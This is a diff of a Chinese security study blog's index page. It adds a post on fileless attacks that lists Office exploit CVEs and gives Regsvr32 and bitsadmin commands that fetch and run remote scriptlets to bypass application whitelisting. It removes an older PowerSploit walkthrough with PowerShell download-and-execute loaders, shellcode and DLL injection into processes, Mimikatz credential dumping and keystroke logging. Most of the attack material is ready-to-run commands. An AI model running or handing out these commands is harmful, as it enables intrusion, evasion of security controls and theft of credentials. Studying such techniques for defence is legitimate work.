@@ -261,6 +261,207 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/10/24/无文件攻击方式简介/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="scareing">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/Bloglogo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="scareing的学习笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/10/24/无文件攻击方式简介/" itemprop="url">无文件攻击方式简介</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-24T23:15:24+08:00">
+                2019-10-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/无文件攻击/" itemprop="url" rel="index">
+                    <span itemprop="name">无文件攻击</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="无文件攻击方式简介"><a href="#无文件攻击方式简介" class="headerlink" title="无文件攻击方式简介"></a>无文件攻击方式简介</h1><blockquote>
+<p> “无文件攻击”属于一种影响力非常大的安全威胁。攻击者在利用这种技术实施攻击时，不会在目标主机的磁盘上写入任何的恶意文件，因此而得名“无文件攻击”,部分无文件攻击甚至会删除自身以达到无法被捕获的目的，无文件攻击多使用 “白加黑”，“恶意文档”，“ 内存注入”，等方式绕过众多的反恶意技术的控制，包括应用白名单策略 ，使得难以防范。</p>
+</blockquote>
+<h2 id="0x01-恶意文档"><a href="#0x01-恶意文档" class="headerlink" title="0x01 恶意文档"></a>0x01 恶意文档</h2><h3 id="Office远程命令执行"><a href="#Office远程命令执行" class="headerlink" title="Office远程命令执行"></a>Office远程命令执行</h3><h4 id="例：CVE-2017-11882"><a href="#例：CVE-2017-11882" class="headerlink" title="例：CVE-2017-11882"></a>例：CVE-2017-11882</h4><blockquote>
+<p><a href="https://github.com/Ridter/CVE-2017-11882">https://github.com/Ridter/CVE-2017-11882</a></p>
+</blockquote>
+<h4 id="例：CVE-2018-0802"><a href="#例：CVE-2018-0802" class="headerlink" title="例：CVE-2018-0802"></a>例：CVE-2018-0802</h4><blockquote>
+<p><a href="https://github.com/rxwx/CVE-2018-0802">https://github.com/rxwx/CVE-2018-0802</a> </p>
+</blockquote>
+<h3 id="Docx远程模板注入"><a href="#Docx远程模板注入" class="headerlink" title="Docx远程模板注入"></a>Docx远程模板注入</h3><blockquote>
+<p>建立一个插入恶意宏的Docx模板,再以该恶意模板创建一个正常文档。</p>
+</blockquote>
+<h3 id="普通VBA-VBS宏注入"><a href="#普通VBA-VBS宏注入" class="headerlink" title="普通VBA,VBS宏注入"></a>普通VBA,VBS宏注入</h3><blockquote>
+<p>直接将宏代码插入到文档。</p>
+</blockquote>
+<h2 id="0x02-恶意脚本"><a href="#0x02-恶意脚本" class="headerlink" title="0x02 恶意脚本"></a>0x02 恶意脚本</h2><blockquote>
+<p>其实笔者还见过部分脚本，最后一句为del %0,靠删除自身来达成的无文件。所以基与此，笔者认为命令行脚本都可以在最后加上这种清除痕迹的操作。</p>
+</blockquote>
+<h3 id="PowerShell脚本"><a href="#PowerShell脚本" class="headerlink" title="PowerShell脚本"></a>PowerShell脚本</h3><blockquote>
+<p>powershell恶意代码执行，内存注入，远程脚本注入，wmic。</p>
+</blockquote>
+<p>PowerShell混淆</p>
+<blockquote>
+<p> <a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a> </p>
+<p> <a href="https://github.com/trustedsec/unicorn">https://github.com/trustedsec/unicorn</a> </p>
+</blockquote>
+<h4 id="Bat脚本"><a href="#Bat脚本" class="headerlink" title="Bat脚本"></a>Bat脚本</h4><blockquote>
+<p>白加黑，wmic</p>
+</blockquote>
+<h2 id="0x03-Living-off-the-Land"><a href="#0x03-Living-off-the-Land" class="headerlink" title="0x03 Living off the Land"></a>0x03 Living off the Land</h2><blockquote>
+<p> 对 Microsoft Windows 众多内置工具的滥用。</p>
+</blockquote>
+<h5 id="bypass技巧"><a href="#bypass技巧" class="headerlink" title="bypass技巧"></a>bypass技巧</h5><ul>
+<li>将利用的源文件改名。</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy c:\windows\system32\scrobj.dll NothingToSeeHere.dll</span><br><span class="line">Regsvr32.exe /u /s /i:https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Regsvr32_calc.sct NothingToSeeHere.dll</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>建立指向该文件的符号链接</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Mklink Dave_LovesThis.dll c:\windows\system32\scrobj.dll</span><br><span class="line">Regsvr32.exe /u /s /i:https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Regsvr32_calc.sct Dave_LovesThis.dll</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>NTFS 数据流隐写</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Type c:\windows\system32\scrobj.dll &gt; Just_A_Normal_TextFile.txt:PlacingTheDLLHere</span><br><span class="line">Regsvr32.exe /u /s /i:https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Regsvr32_calc.sct Just_A_Normal_TextFile.txt:PlacingTheDLLHere</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>本地执行,或者下载到本地执行</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Regsvr32.exe /u /s /i:c:\experiments\regsvr32\Regsvr32_calc.sct scrobj.dll</span><br><span class="line">下载执行</span><br><span class="line">bitsadmin /transfer download /download /priority normal https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Regsvr32_calc.sct %TEMP%\test.txt &amp;&amp; regsvr32.exe /s /u /i:%TEMP%\test.txt scrobj.dll</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> <a href="https://github.com/LOLBAS-Project/LOLBAS">https://github.com/LOLBAS-Project/LOLBAS</a> </p>
+<p> <a href="https://github.com/Micropoor/Micro8">https://github.com/Micropoor/Micro8</a> </p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/24/%E6%97%A0%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E7%AE%80%E4%BB%8B/1.png" alt="avatar"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+    <div>
+          
+    </div>
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/10/15/Everything敏感信息泄露/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2766,211 +2967,6 @@ Parse_Keys C:\Users\wdnmd\AppData\Local\Temp\Key.log .\parsed.txt //将key.log�
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/08/26/PowerSploit基本功能演示/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="scareing">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/Bloglogo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="scareing的学习笔记">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/08/26/PowerSploit基本功能演示/" itemprop="url">PowerSploit基本功能演示</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-26T12:12:57+08:00">
-                2019-08-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Powershell/" itemprop="url" rel="index">
-                    <span itemprop="name">Powershell</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="PowerSploit基本功能演示"><a href="#PowerSploit基本功能演示" class="headerlink" title="PowerSploit基本功能演示"></a>PowerSploit基本功能演示</h1><h2 id="模块介绍"><a href="#模块介绍" class="headerlink" title="模块介绍"></a>模块介绍</h2><ul>
-<li><p>AntivirusBypass     //发现杀软查杀特征</p>
-</li>
-<li><p>CodeExecution      //代码执行</p>
-</li>
-<li><p>Exfiltration     //信息收集</p>
-</li>
-<li><p>Mayhem    //破坏性脚本</p>
-</li>
-<li><p>Persistence    //后门</p>
-</li>
-<li><p>Recon     //利用跳板进行内网信息侦擦</p>
-</li>
-<li><p>ScriptModification     //创建或修改脚本</p>
-<h2 id="利用演示"><a href="#利用演示" class="headerlink" title="利用演示"></a>利用演示</h2><h3 id="CodeExecution"><a href="#CodeExecution" class="headerlink" title="CodeExecution"></a>CodeExecution</h3></li>
-<li><ul>
-<li>Invoke-Shellcode.ps1 **</li>
-</ul>
-<p>shellcode注入</p>
-<pre><code>IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/PowerSploit-master/CodeExecution/Invoke-Shellcode.ps1&quot;)
-//下载并导入脚本
-IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/test&quot;)
-//下载powershell的shellcode
-Invoke-Shellcode -Shellcode ($buf) -Force
-//注入下载的shellcode并运行，-force是为了强制执行，用于消除提示。$用于指定变量，buf为test中的数组，数组中包含shellcode。
-Start-Process c:\windows\system32\notepad.exe -Windowstyle Hidden
-//隐藏的开始一个记事本进程。
-Invoke-Shellcode  -ProcessID 10836  -Shellcode ($buf) -Force
-//将shellcode注入到刚刚开始的记事本进程中。</code></pre></li>
-<li><ul>
-<li>Invoke-DllInjection.ps1 **</li>
-</ul>
-<p>dll注入</p>
-<pre><code>IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/PowerSploit-master/CodeExecution/Invoke-DllInjection.ps1&quot;)
-//下载并导入脚本
-Invoke-DllInjection  -ProcessID 10836  -Dll c:\test.dll
-//注入dll到指定进程</code></pre><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3></li>
-<li><ul>
-<li>Invoke-Portscan **</li>
-</ul>
-<p>端口扫描</p>
-<pre><code>IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/PowerSploit-master/Recon/Invoke-Portscan.ps1&quot;)
-//下载并导入脚本
-Invoke-Portscan -Hosts 172.22.35.0,172.22.35.255 -Ports &quot;80,445,3389&quot;
-//扫描指定地址及指定端口</code></pre><h3 id="Exfiltration"><a href="#Exfiltration" class="headerlink" title="Exfiltration"></a>Exfiltration</h3></li>
-<li><ul>
-<li>Invoke-Mimikatz.ps1 **</li>
-</ul>
-<p>密码抓取，实际上就是Mimikatz的PowerShell版本</p>
-<pre><code> IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/PowerSploit-master/Exfiltration/Invoke-Mimikatz.ps1&quot;)
- //下载并导入脚本
- Invoke-Mimikatz -DumpCreds
- //抓取密码
-
-** Get-Keystrokes.ps1 **</code></pre><p>键盘记录及鼠标点击记录</p>
-<pre><code>IEX(New-Object Net.WebClient).DownloadString(&quot;http://172.22.35.241/PowerSploit-master/Exfiltration/Get-Keystrokes.ps1&quot;)
-//下载并导入脚本
-Get-Keystrokes -LogPath c:\test.txt
-//开启记录并保存到指定位置</code></pre></li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/03/PowerSploit%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD%E6%BC%94%E7%A4%BA/1.png" alt="avatar"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-    <div>
-          
-    </div>
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -3023,7 +3019,7 @@ Get-Keystrokes -LogPath c:\test.txt
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">23</span>
+                  <span class="site-state-item-count">24</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -3034,7 +3030,7 @@ Get-Keystrokes -LogPath c:\test.txt
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-count">17</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -3066,7 +3062,13 @@ Get-Keystrokes -LogPath c:\test.txt
             <div class="links-of-author motion-element">
                 
                   <span class="links-of-author-item">
-                    <a href="mailto:jickhab@gmail.com" target="_blank" title="E-Mail">
+                    <a href="https://github.com/scareing" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:scareing@outlook.com" target="_blank" title="E-Mail">
                       
                         <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                   </span>
